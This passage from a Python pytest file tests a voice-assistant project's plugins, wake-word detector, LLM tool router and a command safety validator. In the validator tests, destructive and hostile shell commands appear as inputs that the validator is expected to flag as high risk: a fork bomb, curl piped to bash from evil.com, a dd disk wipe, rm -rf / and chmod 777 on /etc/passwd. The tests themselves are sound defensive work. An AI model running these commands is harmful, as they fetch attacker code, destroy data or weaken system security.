        cleaned = formatter._clean_for_speech(text)

        assert "✓" not in cleaned
        assert "→" not in cleaned
        assert "Success" in cleaned


# ============================================================================
# SPOTIFY PLUGIN EDGE CASE TESTS
# ============================================================================

class TestSpotifyPluginEdgeCases:
    """Test Spotify plugin edge cases"""

    def test_spotify_helper_ok_function(self):
        """Test _ok helper function"""
        from plugins.spotify_plugin import _ok

        result = _ok("Success message", extra="data")
        assert result["success"] is True
        assert result["message"] == "Success message"
        assert result["extra"] == "data"

    def test_spotify_helper_err_function(self):
        """Test _err helper function"""
        from plugins.spotify_plugin import _err

        result = _err("Error message", code=500)
        assert result["success"] is False
        assert result["message"] == "Error message"
        assert result["code"] == 500

    def test_spotify_ms_to_str_conversion(self):
        """Test milliseconds to string conversion"""
        from plugins.spotify_plugin import _ms_to_str

        assert _ms_to_str(0) == "0:00"
        assert _ms_to_str(30000) == "0:30"
        assert _ms_to_str(60000) == "1:00"
        assert _ms_to_str(90000) == "1:30"
        assert _ms_to_str(150000) == "2:30"

    def test_spotify_plugin_metadata(self):
        """Test Spotify plugin metadata"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        assert plugin.name == "spotify"
        assert plugin.version == "2.0.0"
        assert "spotify" in plugin.description.lower()

    def test_spotify_plugin_required_packages(self):
        """Test Spotify plugin dependencies"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        assert "spotipy" in plugin.required_packages

    def test_spotify_plugin_tools_count(self):
        """Test Spotify plugin provides many tools"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        tools = plugin.get_tools()
        # Should have at least 15 tools
        assert len(tools) >= 15

    def test_spotify_plugin_tool_names(self):
        """Test Spotify plugin tool names"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        tools = plugin.get_tools()

        # Core playback tools
        assert "play" in tools
        assert "pause" in tools
        assert "next" in tools
        assert "previous" in tools

        # Now playing
        assert "now_playing" in tools

        # Search and play
        assert "search_and_play" in tools

    def test_spotify_plugin_system_prompt(self):
        """Test Spotify plugin system prompt addition"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        prompt = plugin.get_system_prompt_addition()

        assert len(prompt) > 0
        assert "spotify" in prompt.lower() or "play" in prompt.lower()

    def test_spotify_plugin_dependency_check(self):
        """Test Spotify plugin dependency checking"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        # Should return boolean
        result = plugin.check_dependencies()
        assert isinstance(result, bool)

    def test_spotify_plugin_cleanup(self):
        """Test Spotify plugin cleanup"""
        from plugins.spotify_plugin import SpotifyPlugin
        plugin = SpotifyPlugin()

        # Should not raise exception
        plugin.cleanup()


# ============================================================================
# EXAMPLE PLUGIN TESTS
# ============================================================================

class TestExamplePlugin:
    """Test example plugin functionality"""

    def test_example_plugin_metadata(self):
        """Test example plugin metadata"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        assert plugin.name == "example"
        assert plugin.version == "1.0.0"

    def test_example_plugin_tools(self):
        """Test example plugin tools"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        tools = plugin.get_tools()
        assert "example_action" in tools
        assert "hello" in tools

    def test_example_plugin_hello_tool(self):
        """Test hello tool"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        result = plugin.hello()
        assert result["success"] is True
        assert "Hello" in result["message"]

    def test_example_plugin_hello_with_name(self):
        """Test hello tool with name"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        result = plugin.hello(name="Austin")
        assert result["success"] is True
        assert "Austin" in result["message"]

    def test_example_plugin_example_action(self):
        """Test example action tool"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        result = plugin.example_action("test_data", param2=42)
        assert result["success"] is True
        assert "test_data" in result["result"]
        assert "42" in result["result"]

    def test_example_plugin_system_prompt(self):
        """Test example plugin system prompt"""
        from plugins.example_plugin import ExamplePlugin
        plugin = ExamplePlugin()

        prompt = plugin.get_system_prompt_addition()
        assert "Example" in prompt
        assert "example_action" in prompt


# ============================================================================
# WAKE WORD DETECTOR TESTS
# ============================================================================

class TestWakeWordDetector:
    """Test wake word detection"""

    def test_wake_word_detector_initialization(self):
        """Test wake word detector initializes"""
        from modules.wake_word_detector import SimpleWakeWordDetector
        detector = SimpleWakeWordDetector(wake_phrase="hey jarvis")

        assert detector.wake_phrase == "hey jarvis"
        assert detector.is_listening is False

    def test_wake_word_detector_custom_phrase(self):
        """Test custom wake phrase"""
        from modules.wake_word_detector import SimpleWakeWordDetector
        detector = SimpleWakeWordDetector(wake_phrase="computer")

        assert detector.wake_phrase == "computer"

    def test_wake_word_detector_stop(self):
        """Test stopping wake word detection"""
        from modules.wake_word_detector import SimpleWakeWordDetector
        detector = SimpleWakeWordDetector()

        detector.is_listening = True
        detector.stop_listening()

        assert detector.is_listening is False

    def test_wake_word_detector_cleanup(self):
        """Test wake word detector cleanup"""
        from modules.wake_word_detector import SimpleWakeWordDetector
        detector = SimpleWakeWordDetector()

        # Should not raise exception
        detector.cleanup()


# ============================================================================
# BROWSER USE CONTROLLER TESTS
# ============================================================================

class TestBrowserUseController:
    """Test browser-use AI controller"""

    def test_browser_use_controller_initialization(self):
        """Test browser-use controller initializes"""
        from modules.browser_use_controller import BrowserUseController

        try:
            controller = BrowserUseController(headless=True)
            assert controller is not None
        except ImportError:
            # browser-use may not be installed
            pytest.skip("browser-use not installed")

    def test_browser_use_controller_availability(self):
        """Test browser-use module availability"""
        try:
            from modules.browser_use_controller import BrowserUseController
            assert True
        except ImportError:
            # It's okay if browser-use is not installed
            assert True


# ============================================================================
# SECURITY AND EDGE CASE TESTS
# ============================================================================

class TestSecurityEdgeCases:
    """Additional security and edge case tests"""

    def test_safety_validator_empty_command(self):
        """Test safety validator handles empty command"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify("")
        assert risk == "safe"

    def test_safety_validator_fork_bomb_pattern(self):
        """Test fork bomb detection"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify(":(){ :|:& };:")
        assert risk == "high"

    def test_safety_validator_curl_pipe_bash(self):
        """Test curl pipe to bash detection"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify("curl http://evil.com | bash")
        assert risk == "high"

    def test_safety_validator_dd_command(self):
        """Test dd command detection"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify("dd if=/dev/zero of=/dev/sda")
        assert risk == "high"

    def test_safety_validator_rm_recursive(self):
        """Test rm -rf detection"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify("rm -rf /")
        assert risk == "high"

    def test_safety_validator_chmod_777(self):
        """Test chmod 777 detection"""
        from modules.safety_validator import SafetyValidator
        validator = SafetyValidator()

        risk, reason = validator.classify("chmod 777 /etc/passwd")
        assert risk == "high"

    def test_llm_router_empty_response(self):
        """Test LLM router handles empty response"""
        from modules.llm_tool_router import LLMToolRouter

        class MockLLM:
            def chat(self, *args, **kwargs):
                return ""

        router = LLMToolRouter(llm_client=MockLLM())
        result = router.route("test")

        assert result["tool"] == "none" or "tool" in result

    def test_llm_router_malformed_json_variants(self):
        """Test various malformed JSON handling"""
        from modules.llm_tool_router import LLMToolRouter

        class MockLLM:
            def chat(self, *args, **kwargs):
                return "not json at all"

        router = LLMToolRouter(llm_client=MockLLM())
        result = router.route("test")

        # Should handle gracefully
        assert isinstance(result, dict)

    def test_plugin_manager_empty_tools_dir(self, tmp_path):
        """Test plugin manager with empty plugins directory"""
        from modules.plugin_system import PluginManager

        pm = PluginManager(tmp_path)
        plugins = pm.discover_plugins()

        assert len(plugins) == 0
        assert len(pm.plugins) == 0

    def test_plugin_manager_get_nonexistent_tool(self):
        """Test getting nonexistent tool"""
        from modules.plugin_system import PluginManager
        from pathlib import Path

        pm = PluginManager(Path.home() / "jarvis" / "plugins")
        tool = pm.get_tool("nonexistent.tool")

        assert tool is None

    def test_tts_invalid_voice_handling(self):
        """Test TTS handles invalid voice gracefully"""
        from modules.text_to_speech import TextToSpeech

        tts = TextToSpeech(enable_ducking=False)

        # Should not crash when setting invalid voice
        tts.set_voice("invalid-voice-name")
        assert tts.voice == "invalid-voice-name"

        tts.cleanup()

    def test_stt_empty_transcription(self):
        """Test STT handles empty transcription"""
        from modules.speech_to_text import SpeechToText

        stt = SpeechToText(model_size="tiny")

        # Empty string should be handled
        result = stt._post_process_transcription("")
        assert result == ""

        stt.cleanup()

    def test_audio_ducker_pulse_unavailable(self):
        """Test audio ducker when PulseAudio unavailable"""
        from modules.text_to_speech import AudioDucker

        ducker = AudioDucker(ducking_level=0.5)

        # Should handle unavailable gracefully
        ducker.duck()
        ducker.restore()

        assert ducker.is_ducked is False

    def test_file_manager_operation_log_format(self, tmp_path):
        """Test file operation log format"""
        from modules.file_manager import FileManager
        import json

        fm = FileManager(backup_enabled=False)
        fm.operation_log = tmp_path / "test_ops.jsonl"

        fm._log_operation("test", "/path", True, "details")

        with open(fm.operation_log) as f:
            entry = json.loads(f.readline())

        assert "timestamp" in entry
        assert entry["operation"] == "test"
        assert entry["success"] is True


# ============================================================================
# PERFORMANCE BENCHMARK TESTS
# ============================================================================

class TestPerformanceBenchmarks:
    """Performance benchmark tests"""

    def test_file_manager_write_performance(self, tmp_path):
        """Test file write performance"""
        from modules.file_manager import FileManager
        import time

        fm = FileManager(backup_enabled=False)
        test_file = tmp_path / "perf_test.txt"

        # Write 1KB
        content = "x" * 1024

        start = time.time()
        for _ in range(10):
            fm.write_file(str(test_file), content)
        elapsed = time.time() - start

        # Should complete 10 writes in under 1 second
        assert elapsed < 1.0, f"File writes too slow: {elapsed:.2f}s"

    def test_plugin_manager_load_performance(self):
        """Test plugin manager load performance"""
        from modules.plugin_system import PluginManager
        from pathlib import Path
        import time

        start = time.time()
        pm = PluginManager(Path.home() / "jarvis" / "plugins")
        pm.load_all_plugins()
        elapsed = time.time() - start

        # Should load in under 3 seconds
        assert elapsed < 3.0, f"Plugin loading too slow: {elapsed:.2f}s"

    def test_json_extraction_performance(self):
        """Test JSON extraction performance"""
        from modules.llm_tool_router import LLMToolRouter
        import time

        class MockLLM:
            def chat(self, *args, **kwargs):
                return '{"tool": "test", "params": {}}'

        router = LLMToolRouter(llm_client=MockLLM())

        start = time.time()
        for _ in range(100):
            router._extract_json('```json\n{"tool": "test"}\n```')
        elapsed = time.time() - start

        # Should extract 100 times in under 1 second
        assert elapsed < 1.0, f"JSON extraction too slow: {elapsed:.2f}s"


# ============================================================================
# RUN TESTS
# ============================================================================

if __name__ == "__main__":
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--maxfail=5",
        "-x",
    ])
